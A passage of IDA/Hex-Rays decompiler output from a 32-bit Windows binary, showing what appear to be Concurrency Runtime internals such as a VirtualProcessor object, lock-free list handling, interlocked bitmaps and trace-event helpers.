    v4 = (_DWORD *)v3;
    v5 = 64;
    do
    {
      *v4 = 0;
      v4 += 2;
      *(v4 - 1) = 0;
      --v5;
    }
    while ( v5 );
  }
  else
  {
    v3 = 0;
  }
  v7 = (void *)this[3];
  this[4] = v3;
  memset(v7, 0, 0x100u);
  return this;
}
// 46D404: using guessed type int __cdecl unknown_libname_28(_DWORD);

//----- (0047C27C) --------------------------------------------------------
_DWORD *__thiscall sub_47C27C(_DWORD *this)
{
  _DWORD *v2; // esi

  v2 = this + 33;
  *this = &Concurrency::details::VirtualProcessor::`vftable';
  sub_47C204(this + 4, (int)(this + 33));
  this[10] = 0;
  this[11] = 0;
  this[18] = 0;
  this[19] = 0;
  *v2 = 0;
  this[37] = 0;
  this[38] = 0;
  this[39] = 0;
  this[40] = 0;
  this[41] = 0;
  this[42] = 0;
  this[48] = 0;
  return this;
}
// 4C10B4: using guessed type void *Concurrency::details::VirtualProcessor::`vftable';

//----- (0047C2DC) --------------------------------------------------------
void __thiscall sub_47C2DC(void *this)
{
  *(_DWORD *)this = &Concurrency::details::VirtualProcessor::`vftable';
  if ( *((_DWORD *)this + 23) )
  {
    sub_476E8F(*((PSLIST_ENTRY *)this + 23));
    *((_DWORD *)this + 23) = 0;
  }
  j_j_j___free_base(*((void **)this + 42));
  sub_4779ED((void **)this + 4);
}
// 4C10B4: using guessed type void *Concurrency::details::VirtualProcessor::`vftable';

//----- (0047C33C) --------------------------------------------------------
void *__thiscall sub_47C33C(void *this, char a2)
{
  sub_47C2DC(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (0047C361) --------------------------------------------------------
bool __thiscall sub_47C361(_DWORD *this, unsigned int a2)
{
  volatile signed __int32 *v2; // edi
  int v3; // edx
  int v4; // eax

  v2 = (volatile signed __int32 *)(this[22] + 4 * (a2 >> 5));
  v3 = 1 << (a2 & 0x1F);
  v4 = v3 & *v2;
  if ( v4 )
    _InterlockedAnd(v2, ~v3);
  return v4 != 0;
}

//----- (0047C396) --------------------------------------------------------
int __thiscall sub_47C396(_DWORD *this, int a2)
{
  int result; // eax

  if ( a2 )
  {
    sub_47E493((_DWORD *)a2);
    result = (*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)a2 + 28))(a2, this);
  }
  this[31] = a2;
  if ( a2 )
  {
    if ( (*(_BYTE *)(a2 + 179) & 1) != 0 )
    {
      ++this[27];
      *(_BYTE *)(a2 + 179) &= ~1u;
    }
  }
  return result;
}

//----- (0047C3DF) --------------------------------------------------------
bool __thiscall sub_47C3DF(int this)
{
  if ( !*(_BYTE *)(this + 98) )
    return sub_47C361(**(_DWORD ***)(this + 80), *(_DWORD *)(this + 144));
  *(_BYTE *)(this + 98) = 0;
  return 1;
}

//----- (0047C423) --------------------------------------------------------
char __cdecl sub_47C423(int a1)
{
  char result; // al

  result = sub_475B2C(*(_DWORD **)(a1 + 36));
  if ( !result )
  {
    sub_47C50B(*(_DWORD **)(a1 + 16));
    *(_DWORD *)(a1 + 16) = 0;
    result = a1 + 72;
    _InterlockedExchange((volatile __int32 *)(a1 + 72), 0);
  }
  return result;
}

//----- (0047C42F) --------------------------------------------------------
char __thiscall sub_47C42F(__int32 this, __int32 *a2, int a3, char a4)
{
  signed __int32 v4; // ebx
  __int32 v5; // edx
  bool v6; // al
  signed __int32 v7; // eax
  char result; // al

  v4 = *(_DWORD *)(this + 8);
  if ( (v4 & a3) == 0 )
    return 0;
  if ( a3 == 15 )
  {
    v5 = _InterlockedExchange((volatile __int32 *)(this + 8), 0);
    v6 = v5 != 0;
  }
  else
  {
    while ( 1 )
    {
      v7 = _InterlockedCompareExchange((volatile signed __int32 *)(this + 8), 0, v4);
      v5 = v7;
      if ( v7 == v4 )
        break;
      v4 = v7;
      if ( (v7 & a3) == 0 )
        return 0;
    }
    v6 = 1;
  }
  if ( !v6 )
    return 0;
  if ( a4 )
  {
    _InterlockedDecrement((volatile signed __int32 *)(**(_DWORD **)(this + 80) + 436));
    _InterlockedDecrement((volatile signed __int32 *)(*(_DWORD *)(this + 80) + 28));
    if ( v5 == 4 || v5 == 8 )
    {
      _InterlockedDecrement((volatile signed __int32 *)(**(_DWORD **)(this + 80) + 440));
      _InterlockedDecrement((volatile signed __int32 *)(*(_DWORD *)(this + 80) + 32));
    }
  }
  result = 1;
  *a2 = v5;
  a2[1] = this;
  *(_DWORD *)(this + 12) = v5;
  return result;
}

//----- (0047C4C4) --------------------------------------------------------
signed __int32 __thiscall sub_47C4C4(_DWORD *this, int a2)
{
  signed __int32 result; // eax

  result = 1;
  if ( *(_DWORD *)((a2 << 7) + this[23]) == 1 )
    return _InterlockedCompareExchange((volatile signed __int32 *)((a2 << 7) + this[23]), 0, 1);
  return result;
}

//----- (0047C4E9) --------------------------------------------------------
int __thiscall sub_47C4E9(_DWORD **this, int a2)
{
  return (*(int (__thiscall **)(_DWORD *, int))(*this[22] + 24))(this[22], a2);
}

//----- (0047C50B) --------------------------------------------------------
int __stdcall sub_47C50B(_DWORD *a1)
{
  int (__thiscall ***v2)(_DWORD, int); // eax
  int result; // eax

  while ( a1 )
  {
    v2 = (int (__thiscall ***)(_DWORD, int))(a1 - 47);
    a1 = (_DWORD *)*a1;
    result = sub_47C1E2(v2);
  }
  return result;
}

//----- (0047C52C) --------------------------------------------------------
int __thiscall sub_47C52C(_DWORD **this, int a2)
{
  return (*(int (__thiscall **)(_DWORD *, int))(*this[22] + 28))(this[22], a2);
}

//----- (0047C54E) --------------------------------------------------------
char __thiscall sub_47C54E(_DWORD **this, __int32 a2, int a3, struct _SINGLE_LIST_ENTRY *a4)
{
  volatile signed __int32 *v5; // esi
  int v7; // eax

  v5 = (volatile signed __int32 *)*this[20];
  if ( a2 == 1 || a2 == 4 )
  {
    if ( sub_47764B(v5, 1) )
    {
      v7 = a3;
      if ( !a3 )
        v7 = sub_4754E2(v5);
      return ((int (__thiscall *)(_DWORD **, int, struct _SINGLE_LIST_ENTRY *))(*this)[7])(this, v7, a4);
    }
    else
    {
      if ( a4 )
        sub_476924((int)v5, a4, 1);
      sub_47C840((int)this, a2, 0);
      return 0;
    }
  }
  else
  {
    (*(void (__thiscall **)(_DWORD *, _DWORD *))(*this[22] + 20))(this[22], this[32]);
    return 1;
  }
}

//----- (0047C5DF) --------------------------------------------------------
char __thiscall sub_47C5DF(int this, struct _SINGLE_LIST_ENTRY *a2)
{
  char result; // al

  result = 0;
  if ( *(_DWORD *)this )
  {
    result = sub_47C54E(
               *(_DWORD ***)(this + 4),
               *(_DWORD *)this,
               *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(*(_DWORD *)(this + 4) + 80) + 4) + 8),
               a2);
    *(_DWORD *)this = 0;
  }
  return result;
}

//----- (0047C60A) --------------------------------------------------------
PSLIST_ENTRY __thiscall sub_47C60A(_DWORD *this)
{
  PSLIST_ENTRY result; // eax

  result = (PSLIST_ENTRY)this[23];
  if ( !result )
  {
    result = sub_475999(0);
    this[23] = result;
  }
  return result;
}

//----- (0047C620) --------------------------------------------------------
int __thiscall sub_47C620(unsigned int *this, int a2)
{
  unsigned int *v3; // [esp+0h] [ebp-4h] BYREF

  v3 = this;
  sub_4751BF(this + 90, &a2, &v3);
  return (int)v3;
}

//----- (0047C63E) --------------------------------------------------------
int __thiscall sub_47C63E(int this, int a2, int a3)
{
  unsigned int **v3; // eax
  unsigned int *v4; // ebx
  int v5; // eax
  _DWORD *v6; // esi
  int v7; // eax
  __int64 v8; // rax
  int v9; // eax
  int v10; // edi
  int *v11; // eax
  unsigned int v12; // esi
  int v13; // eax
  int v15; // [esp-4h] [ebp-24h]
  int v16[4]; // [esp+Ch] [ebp-14h] BYREF
  int v17; // [esp+1Ch] [ebp-4h]

  v17 = this;
  *(_DWORD *)(this + 80) = a2;
  *(_DWORD *)(this + 200) = 0;
  *(_DWORD *)(this + 204) = 0;
  *(_DWORD *)(this + 224) = 1;
  *(_DWORD *)(this + 212) = 1;
  *(_DWORD *)(this + 120) = 0;
  *(_DWORD *)(this + 84) = *(_DWORD *)(a2 + 4);
  v3 = *(unsigned int ***)(this + 80);
  *(_WORD *)(this + 172) = 0;
  *(_DWORD *)(this + 88) = a3;
  *(_DWORD *)(this + 8) = 0;
  *(_DWORD *)(this + 104) = 0;
  *(_DWORD *)(this + 108) = 0;
  *(_DWORD *)(this + 112) = 0;
  *(_DWORD *)(this + 116) = 0;
  *(_DWORD *)(this + 124) = 0;
  *(_DWORD *)(this + 176) = 0;
  *(_DWORD *)(this + 192) = 0;
  *(_DWORD *)(this + 92) = 0;
  *(_WORD *)(this + 96) = 0;
  *(_BYTE *)(this + 98) = 1;
  v4 = *v3;
  *(_DWORD *)(v17 + 136) = (*(int (__thiscall **)(int))(*(_DWORD *)a3 + 16))(a3);
  v5 = (*(int (__thiscall **)(int))(*(_DWORD *)a3 + 4))(a3);
  v6 = (_DWORD *)v17;
  *(_DWORD *)(v17 + 140) = v5;
  v6[36] = sub_47C620(v4, v5);
  v7 = sub_471D0E();
  sub_475A3C(v6 + 41, v7);
  sub_47CE71(v6 + 41);
  *(_DWORD *)(v6[42] + 4 * (v6[36] >> 5)) |= 1 << (v6[36] & 0x1F);
  v8 = sub_4824B9((_DWORD *)(v17 + 40), v17, (unsigned int)(v4[3] != 0) + 1);
  v9 = (*(int (__fastcall **)(_DWORD, _DWORD))(***(_DWORD ***)(v17 + 80) + 4))(**(_DWORD **)(v17 + 80), HIDWORD(v8));
  v10 = v17;
  v11 = sub_481D45(v16, 3, *(_DWORD *)(v17 + 140), v9, v17);
  sub_4777A9((int *)(v10 + 148), v11);
  v12 = *(_DWORD *)(v10 + 144);
  sub_47C7FC(v4 + 18, v12);
  sub_47C4C4(v4, v12);
  v15 = *(_DWORD *)(v17 + 136);
  v13 = (*(int (__thiscall **)(_DWORD))(***(_DWORD ***)(v10 + 80) + 4))(**(_DWORD **)(v10 + 80));
  return sub_47CDE6(1, 4u, v13, v15);
}
// 47C63E: using guessed type int var_14[4];

//----- (0047C7BC) --------------------------------------------------------
signed __int32 __thiscall sub_47C7BC(_DWORD *this, unsigned int a2)
{
  signed __int32 v3; // esi

  v3 = _InterlockedDecrement((volatile signed __int32 *)(this[2] + 4 * a2));
  if ( !v3 )
  {
    sub_47CC85(this, a2);
    _InterlockedAnd((volatile signed __int32 *)(this[1] + 4 * (a2 >> 5)), ~(1 << (a2 & 0x1F)));
  }
  return v3;
}

//----- (0047C7FC) --------------------------------------------------------
signed __int32 __thiscall sub_47C7FC(_DWORD *this, unsigned int a2)
{
  signed __int32 v2; // esi

  v2 = _InterlockedIncrement((volatile signed __int32 *)(this[2] + 4 * a2));
  if ( v2 == 1 )
  {
    sub_47CC3D(this, a2);
    _InterlockedOr((volatile signed __int32 *)(this[1] + 4 * (a2 >> 5)), 1 << (a2 & 0x1F));
  }
  return v2;
}

//----- (0047C840) --------------------------------------------------------
int __thiscall sub_47C840(int this, __int32 a2, char a3)
{
  int result; // eax

  *(_DWORD *)(this + 128) = *(_DWORD *)(this + 124);
  if ( a3 && (a2 == 1 || a2 == 4) )
    sub_47764B(**(volatile signed __int32 ***)(this + 80), 0);
  _InterlockedIncrement((volatile signed __int32 *)(**(_DWORD **)(this + 80) + 436));
  _InterlockedIncrement((volatile signed __int32 *)(*(_DWORD *)(this + 80) + 28));
  if ( a2 == 4 || a2 == 8 )
  {
    _InterlockedIncrement((volatile signed __int32 *)(**(_DWORD **)(this + 80) + 440));
    _InterlockedIncrement((volatile signed __int32 *)(*(_DWORD *)(this + 80) + 32));
  }
  result = this + 8;
  _InterlockedExchange((volatile __int32 *)(this + 8), a2);
  return result;
}

//----- (0047C8B0) --------------------------------------------------------
char __thiscall sub_47C8B0(_BYTE *this)
{
  char result; // al
  _DWORD **v4; // ecx
  __int32 v5; // [esp-Ch] [ebp-18h]
  __int32 v6[2]; // [esp+4h] [ebp-8h] BYREF

  v6[0] = 0;
  result = sub_47C42F((__int32)this, v6, 15, 1);
  if ( result )
  {
    if ( v6[0] == 2 || v6[0] == 8 )
    {
      v4 = (_DWORD **)v6[1];
      v5 = v6[0];
      this[173] = 1;
      return sub_47C54E(v4, v5, 0, 0);
    }
    else
    {
      return (*(int (__thiscall **)(_BYTE *))(*(_DWORD *)this + 12))(this);
    }
  }
  else
  {
    this[173] = 1;
  }
  return result;
}

//----- (0047C91A) --------------------------------------------------------
signed __int32 __thiscall sub_47C91A(int this)
{
  int v2; // eax

  v2 = (*(int (__thiscall **)(_DWORD, _DWORD))(**(_DWORD **)(**(_DWORD **)(this + 80) + 428) + 20))(
         *(_DWORD *)(**(_DWORD **)(this + 80) + 428),
         *(_DWORD *)(this + 88));
  return sub_47D10D(*(volatile signed __int32 ***)(this + 80), v2, 1);
}

//----- (0047C94D) --------------------------------------------------------
int __thiscall sub_47C94D(_DWORD *this)
{
  int v1; // edi
  int v2; // eax
  int v3; // edx
  __int32 v4; // ebx

  v1 = this[1] - 1;
  v2 = this[3];
  v3 = v1 & this[2];
  this[1] = v1;
  v4 = _InterlockedExchange((volatile __int32 *)(v2 + 4 * v3), 0);
  if ( !v4 )
    this[1] = v1 + 1;
  if ( (v4 & 1) == 0 )
    return v4;
  v4 &= ~1u;
  if ( sub_477F29((int *)(this[4] + 8 * (v1 & this[2])), 0) )
    return v4;
  else
    return 1;
}

//----- (0047C99B) --------------------------------------------------------
char __thiscall sub_47C99B(PSLIST_HEADER ListHead, signed __int32 a2, int a3, char a4)
{
  int v5; // eax
  int v6; // ebx
  struct _SINGLE_LIST_ENTRY *Next; // ecx
  int v8; // edi
  int v9; // eax
  int v10; // edi
  int v11; // eax
  USHORT DepthSList; // ax
  struct _SINGLE_LIST_ENTRY *v13; // eax
  struct _SINGLE_LIST_ENTRY *v15; // [esp-4h] [ebp-18h]
  int v16; // [esp-4h] [ebp-18h]

  v5 = a3 >> *(_DWORD *)&ListHead[5].Depth;
  v6 = a3 & ((int)&ListHead[5].Next.Next[-1].Next + 3);
  if ( v5 >= *(_DWORD *)&ListHead[7].Depth )
    return 0;
  Next = ListHead[7].Next.Next;
  v8 = *(_DWORD *)&ListHead[6].Depth;
  if ( v5 < (int)Next )
  {
    v10 = *(_DWORD *)(v8 + 4 * v5);
  }
  else
  {
    v9 = v5 - (_DWORD)Next;
    v10 = *(_DWORD *)(v8 + 4 * (_DWORD)Next - 4);
    if ( v9 >= 0 )
    {
      v11 = v9 + 1;
      do
      {
        v10 = *(_DWORD *)(v10 + 4);
        --v11;
      }
      while ( v11 );
    }
  }
  if ( _InterlockedCompareExchange((volatile signed __int32 *)(*(_DWORD *)v10 + 4 * v6), 0, a2) != a2 )
    return 0;
  _InterlockedCompareExchange((volatile signed __int32 *)(v10 + 8), v6, -2);
  if ( a4 )
  {
    DepthSList = QueryDepthSList(ListHead);
    v15 = (struct _SINGLE_LIST_ENTRY *)(a2 + 188);
    if ( DepthSList <= *(int *)&ListHead[8].Depth )
    {
      InterlockedPushEntrySList(ListHead, v15);
    }
    else
    {
      InterlockedPushEntrySList(ListHead + 1, v15);
      if ( QueryDepthSList(ListHead + 1) > *(int *)&ListHead[8].Depth
        && !sub_475B2C(*(_DWORD **)&ListHead[4].Depth)
        && !_InterlockedCompareExchange((volatile signed __int32 *)&ListHead[9], 1, 0) )
      {
        v13 = InterlockedFlushSList(ListHead + 1);
        v16 = *(_DWORD *)&ListHead[4].Depth;
        ListHead[2].Next.Next = v13;
        sub_4761CF(
          (int (__cdecl **)(int))&ListHead[2].Depth,
          (int (__cdecl *)(int))sub_47C423,
          (int (__cdecl *)(int))ListHead,
          v16);
      }
    }
  }
  return 1;
}

//----- (0047CA8F) --------------------------------------------------------
char __thiscall sub_47CA8F(int **this)
{
  int v1; // edi
  int v2; // eax
  int v3; // ebx
  _DWORD *v4; // edi
  _DWORD *v5; // esi
  void (__thiscall *v6)(_DWORD *); // ebx
  signed __int32 v7; // ebx
  int *v8; // eax
  int v9; // eax
  int v11[3]; // [esp-10h] [ebp-24h] BYREF
  int v12; // [esp-4h] [ebp-18h]
  _DWORD *v13; // [esp+Ch] [ebp-8h]
  int **v14; // [esp+10h] [ebp-4h]

  v1 = (int)this;
  v14 = this;
  sub_476CEA(*this[20], (int)(this + 53));
  sub_47C7BC((_DWORD *)(**(_DWORD **)(v1 + 80) + 48), *(_DWORD *)(v1 + 144));
  _InterlockedDecrement((volatile signed __int32 *)(*(_DWORD *)(v1 + 80) + 36));
  if ( !*(_BYTE *)(v1 + 172) )
    _InterlockedDecrement((volatile signed __int32 *)(**(_DWORD **)(v1 + 80) + 20));
  sub_47CC03(**(volatile signed __int32 ***)(v1 + 80), (_DWORD *)v1);
  if ( !*(_BYTE *)(v1 + 96) )
    sub_47C7BC((_DWORD *)(**(_DWORD **)(v1 + 80) + 72), *(_DWORD *)(v1 + 144));
  *(_DWORD *)(v1 + 124) = 0;
  v2 = *(_DWORD *)(v1 + 20) - *(_DWORD *)(v1 + 16);
  v13 = (_DWORD *)(v1 + 16);
  if ( v2 <= 0 )
    v3 = 0;
  else
    v3 = sub_47C94D((_DWORD *)(v1 + 16));
  if ( v3 )
  {
    v4 = v13;
    do
    {
      v5 = (_DWORD *)sub_406D60((_DWORD *)(v3 + 4));
      sub_4777A9(v11, v5 + 3);
      sub_47F548(v5, v3, v11[0], v11[1], v11[2], v12);
      if ( v4[1] - *v4 <= 0 )
        v3 = 0;
      else
        v3 = sub_47C94D(v4);
    }
    while ( v3 );
    v1 = (int)v14;
  }
  v13 = *(_DWORD **)(v1 + 88);
  v6 = *(void (__thiscall **)(_DWORD *))(*v13 + 8);
  v12 = (*(int (__thiscall **)(_DWORD))(***(_DWORD ***)(v1 + 80) + 52))(**(_DWORD **)(v1 + 80));
  v6(v13);
  v7 = (signed __int32)v14;
  v8 = v14[20];
  v14[22] = 0;
  v9 = (*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)*v8 + 4))(*v8, *(_DWORD *)(v7 + 136));
  sub_47CDE6(2, 4u, v9, v12);
  if ( *(_DWORD *)(v7 + 92) )
  {
    sub_476E8F(*(PSLIST_ENTRY *)(v7 + 92));
    *(_DWORD *)(v7 + 92) = 0;
  }
  return sub_47C99B((PSLIST_HEADER)(*(_DWORD *)(v7 + 80) + 56), v7, *(_DWORD *)(v7 + 100), 1);
}

//----- (0047CBF1) --------------------------------------------------------
char __thiscall sub_47CBF1(int this)
{
  return sub_4762DA(**(_DWORD ***)(this + 80), (_DWORD *)(this + 192));
}

//----- (0047CC03) --------------------------------------------------------
volatile signed __int32 *__thiscall sub_47CC03(volatile signed __int32 *this, _DWORD *a2)
{
  unsigned int v3; // edx
  unsigned int v4; // ecx
  volatile signed __int32 *result; // eax

  v3 = a2[26] - a2[28];
  a2[28] = a2[26];
  _InterlockedExchangeAdd(this + 111, v3);
  v4 = a2[27] - a2[29];
  a2[29] = a2[27];
  result = this + 112;
  _InterlockedExchangeAdd(this + 112, v4);
  return result;
}

//----- (0047CC3D) --------------------------------------------------------
int __thiscall sub_47CC3D(_DWORD *this, unsigned int a2)
{
  int v2; // ebx
  int v3; // edi
  int result; // eax
  char v5[8]; // [esp+Ch] [ebp-10h] BYREF
  int v6; // [esp+14h] [ebp-8h]
  void (*v7)(); // [esp+18h] [ebp-4h]

  v2 = this[1];
  v3 = 1 << (a2 & 0x1F);
  result = *(_DWORD *)(v2 + 4 * (a2 >> 5));
  if ( (result & v3) != 0 )
  {
    v6 = 0;
    v7 = sub_46FCCB;
    while ( 1 )
    {
      result = *(_DWORD *)(v2 + 4 * (a2 >> 5));
      if ( (result & v3) == 0 )
        break;
      sub_46E3D5((int)v5);
    }
  }
  return result;
}
// 47CC3D: using guessed type char var_10[8];

//----- (0047CC85) --------------------------------------------------------
int __thiscall sub_47CC85(_DWORD *this, unsigned int a2)
{
  int v2; // ebx
  int v3; // edi
  int result; // eax
  char v5[8]; // [esp+Ch] [ebp-10h] BYREF
  int v6; // [esp+14h] [ebp-8h]
  void (*v7)(); // [esp+18h] [ebp-4h]

  v2 = this[1];
  v3 = 1 << (a2 & 0x1F);
  result = *(_DWORD *)(v2 + 4 * (a2 >> 5));
  if ( (result & v3) == 0 )
  {
    v6 = 0;
    v7 = sub_46FCCB;
    while ( 1 )
    {
      result = *(_DWORD *)(v2 + 4 * (a2 >> 5));
      if ( (result & v3) != 0 )
        break;
      sub_46E3D5((int)v5);
    }
  }
  return result;
}
// 47CC85: using guessed type char var_10[8];

//----- (0047CCCD) --------------------------------------------------------
char __thiscall sub_47CCCD(void *this, _DWORD *a2, int a3)
{
  int v4; // esi
  char v6[8]; // [esp+Ch] [ebp-10h] BYREF
  int v7; // [esp+14h] [ebp-8h]
  void (*v8)(); // [esp+18h] [ebp-4h]

  if ( *((_DWORD *)this + 31) )
  {
    v7 = 0;
    v8 = sub_46FCCB;
    do
      sub_46E3D5((int)v6);
    while ( *((_DWORD *)this + 31) );
  }
  v4 = a3;
  if ( a3 )
  {
    if ( !*(_DWORD *)(a3 + 28) )
      sub_47E2E2(a3, (int)a2, 0, 0);
  }
  else
  {
    v4 = sub_47F9F2(a2, 0, 0);
  }
  if ( v4 )
  {
    (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 16))(this, v4);
    (*(void (__thiscall **)(_DWORD, _DWORD))(**((_DWORD **)this + 22) + 20))(
      *((_DWORD *)this + 22),
      *((_DWORD *)this + 31));
    return 1;
  }
  else
  {
    sub_47C840((int)this, 4, 1);
    sub_474EFC(**((_DWORD **)this + 20));
    return 0;
  }
}
// 47CCCD: using guessed type char var_10[8];

//----- (0047CD6B) --------------------------------------------------------
int __cdecl sub_47CD6B(char a1, char a2, int a3, int a4)
{
  int result; // eax
  _DWORD v5[16]; // [esp+4h] [ebp-40h] BYREF

  if ( dword_4F0C68 )
  {
    memset((char *)v5 + 2, 0, 0x3Eu);
    v5[11] = 0x20000;
    LOWORD(v5[0]) = 64;
    LOBYTE(v5[1]) = a1;
    BYTE1(v5[1]) = a2;
    v5[6] = dword_4C0FAC[0];
    v5[7] = dword_4C0FAC[1];
    v5[8] = dword_4C0FAC[2];
    v5[9] = dword_4C0FAC[3];
    v5[13] = a3;
    v5[12] = a4;
    return sub_47C0C1((_DWORD *)dword_4F0C68, dword_4F0C60, dword_4F0C64, (int)v5);
  }
  return result;
}
// 4C0FAC: using guessed type _DWORD dword_4C0FAC[4];
// 4F0C60: using guessed type int dword_4F0C60;
// 4F0C64: using guessed type int dword_4F0C64;
// 4F0C68: using guessed type int dword_4F0C68;

//----- (0047CDE6) --------------------------------------------------------
int __stdcall sub_47CDE6(char a1, unsigned __int8 a2, int a3, int a4)
{
  int result; // eax

  if ( a2 <= (unsigned __int8)byte_4F0C5C )
  {
    result = dword_4F0C58;
    if ( (dword_4F0C58 & 4) != 0 )
      return sub_47CD6B(a1, a2, a3, a4);
  }
  return result;
}
// 4F0C58: using guessed type int dword_4F0C58;
// 4F0C5C: using guessed type char byte_4F0C5C;

//----- (0047CE13) --------------------------------------------------------
char __thiscall sub_47CE13(int this, char a2, char a3)
{
  _DWORD *v4; // eax
  unsigned int v5; // esi
  char result; // al
  _DWORD *v7; // [esp+8h] [ebp-4h]

  v4 = **(_DWORD ***)(this + 80);
  v7 = v4;
  if ( *(_BYTE *)(this + 96) )
  {
    if ( !a2 )
    {
      v5 = *(_DWORD *)(this + 144);
      *(_BYTE *)(this + 98) = 1;
      sub_47C7FC(v4 + 18, v5);
      sub_47C4C4(v7, v5);
    }
  }
  else if ( a2 )
  {
    sub_47C7BC(v4 + 18, *(_DWORD *)(this + 144));
  }
  result = a3;
  *(_BYTE *)(this + 96) = a2;
  *(_BYTE *)(this + 97) = a3;
  return result;
}

//----- (0047CE71) --------------------------------------------------------
int __thiscall sub_47CE71(_DWORD *this)
{
  unsigned int v1; // edx
  unsigned int i; // esi
  int result; // eax

  v1 = (unsigned int)(*this + 31) >> 5;
  for ( i = 0; i < v1; ++i )
  {
    result = this[1];
    *(_DWORD *)(result + 4 * i) = 0;
  }
  return result;
}

//----- (0047CE8E) --------------------------------------------------------
char *__thiscall sub_47CE8E(char *this, int a2, int a3, int *a4)
{
  _DWORD *v5; // ecx
  _DWORD *v6; // ecx

  v5 = this + 8;
  *((_DWORD *)this + 1) = a4;
  *v5 = 0;
  v5[1] = 0;
  sub_474E2B((int)v5, a2);
  sub_473C69((unsigned int *)this + 4, 0x1001u);
  *((_DWORD *)this + 7) = 0;
  *((_DWORD *)this + 8) = 0;
  *((_DWORD *)this + 9) = 0;
  *((_DWORD *)this + 10) = 0;
  *((_DWORD *)this + 11) = a3;
  sub_473CA7((PSLIST_HEADER)this + 7, *a4, 256, 0x7FFFFFFF);
  v6 = (_DWORD *)*((_DWORD *)this + 1);
  *(_DWORD *)this = *v6;
  *((_DWORD *)this + 12) = v6[46];
  return this;
}

//----- (0047CF0B) --------------------------------------------------------
void __thiscall sub_47CF0B(PSLIST_HEADER ListHead)
{
  PSLIST_ENTRY v2; // eax
  PSLIST_ENTRY v3; // eax
  struct _SINGLE_LIST_ENTRY *Next; // ebx
  int i; // esi
  struct _SINGLE_LIST_ENTRY *v6; // esi

  v2 = InterlockedFlushSList(ListHead);
  sub_47C50B(v2);
  v3 = InterlockedFlushSList(ListHead + 1);
  sub_47C50B(v3);
  sub_47C50B(&ListHead[2].Next.Next->Next);
  Next = ListHead[6].Next.Next;
  if ( Next )
  {
    do
    {
      for ( i = 0; i < (int)ListHead[5].Next.Next; ++i )
        sub_47C1E2(Next->Next[i].Next);
      v6 = Next[1].Next;
      j_j_j___free_base(Next->Next);
      sub_46C87D(Next);
      Next = v6;
    }
    while ( v6 );
  }
  j_j_j___free_base(*(void **)&ListHead[6].Depth);
}

//----- (0047CF82) --------------------------------------------------------
void __thiscall sub_47CF82(int this)
{
  sub_47CF0B((PSLIST_HEADER)(this + 56));
  sub_47775C((int *)(this + 16));
  j_j_j___free_base(*(void **)(this + 24));
  j_j_j___free_base(*(void **)(this + 12));
}

//----- (0047CFAB) --------------------------------------------------------
int __thiscall sub_47CFAB(int this, signed __int32 a2)
{
  int v3; // edi
  int v4; // ebx
  volatile signed __int32 *v5; // edx
  volatile signed __int32 *v6; // eax
  signed __int32 v7; // edx
  int v8; // eax
  volatile signed __int32 *v9; // edi
  signed __int32 v10; // eax
  volatile __int32 *v11; // edi
  _DWORD *v12; // eax
  int *v13; // ecx
  int v14; // eax
  signed __int32 v15; // eax
  int v16; // edx
  size_t v18; // [esp-8h] [ebp-38h]
  char v19[8]; // [esp+Ch] [ebp-24h] BYREF
  int v20; // [esp+14h] [ebp-1Ch]
  int (*v21)(); // [esp+18h] [ebp-18h]
  _DWORD *v22; // [esp+1Ch] [ebp-14h]
  int *v23; // [esp+20h] [ebp-10h]
  volatile signed __int32 *v24; // [esp+24h] [ebp-Ch]
  int *v25; // [esp+28h] [ebp-8h]
  char v26; // [esp+2Fh] [ebp-1h]

  v26 = 0;
  v3 = 0;
  v25 = 0;
  v4 = *(_DWORD *)(this + 48);
  do
  {
    v5 = (volatile signed __int32 *)(v4 + 8);
    if ( *(int *)(v4 + 8) < -1 )
      goto LABEL_9;
    v6 = *(volatile signed __int32 **)v4;
    v7 = 0;
    v24 = *(volatile signed __int32 **)v4;
    if ( *(int *)(this + 40) <= 0 )
    {
LABEL_8:
      v5 = (volatile signed __int32 *)(v4 + 8);
      goto LABEL_9;
    }
    while ( *v6 )
    {
LABEL_7:
      ++v7;
      v24 = ++v6;
      if ( v7 >= *(_DWORD *)(this + 40) )
        goto LABEL_8;
    }
    v8 = v7 + v3;
    v9 = v24;
    v23 = (int *)v8;
    *(_DWORD *)(a2 + 100) = v8;
    v22 = *(_DWORD **)(this + 64);
    v10 = _InterlockedCompareExchange(v9, a2, 0);
    v3 = (int)v25;
    if ( v10 )
    {
      v6 = v24;
      goto LABEL_7;
    }
    v3 = (int)v23;
    v26 = 1;
    v25 = v23;
    if ( (int)v23 >= (int)v22 )
      _InterlockedIncrement((volatile signed __int32 *)(this + 64));
    v15 = v7;
    v5 = (volatile signed __int32 *)(v4 + 8);
    _InterlockedCompareExchange((volatile signed __int32 *)(v4 + 8), -1, v15);
LABEL_9:
    if ( !v26 )
    {
      _InterlockedCompareExchange(v5, -2, -1);
      v25 = (int *)(*(_DWORD *)(this + 40) + v3);
      v11 = (volatile __int32 *)(v4 + 4);
      if ( !*(_DWORD *)(v4 + 4) && !_InterlockedCompareExchange(v11, 1, 0) )
      {
        v12 = (_DWORD *)unknown_libname_28((unsigned __int64)*(unsigned int *)(this + 40) >> 30 != 0 ? -1 : 4 * *(_DWORD *)(this + 40));
        v18 = 4 * *(_DWORD *)(this + 40);
        v22 = v12;
        memset(v12, 0, v18);
        v13 = (int *)operator new(0xCu);
        v23 = v13;
        if ( v13 )
        {
          v14 = (int)v22;
          v13[1] = 0;
          v13[2] = -1;
          *v13 = v14;
        }
        else
        {
          v13 = 0;
        }
        v16 = *(_DWORD *)(this + 60);
        if ( v16 < *(_DWORD *)(this + 56) )
        {
          *(_DWORD *)(*(_DWORD *)(this + 52) + 4 * v16) = v13;
          ++*(_DWORD *)(this + 60);
        }
        _InterlockedExchange(v11, (__int32)v13);
      }
      if ( *v11 == 1 )
      {
        v20 = 0;
        v21 = sub_46FD09;
        do
          sub_46E3D5((int)v19);
        while ( *v11 == 1 );
      }
    }
    v4 = *(_DWORD *)(v4 + 4);
    v3 = (int)v25;
  }
  while ( !v26 );
  return (int)v25;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 46D404: using guessed type int __cdecl unknown_libname_28(_DWORD);
// 47CFAB: using guessed type char var_24[8];

//----- (0047D10D) --------------------------------------------------------
signed __int32 __thiscall sub_47D10D(volatile signed __int32 **this, int a2, char a3)
{
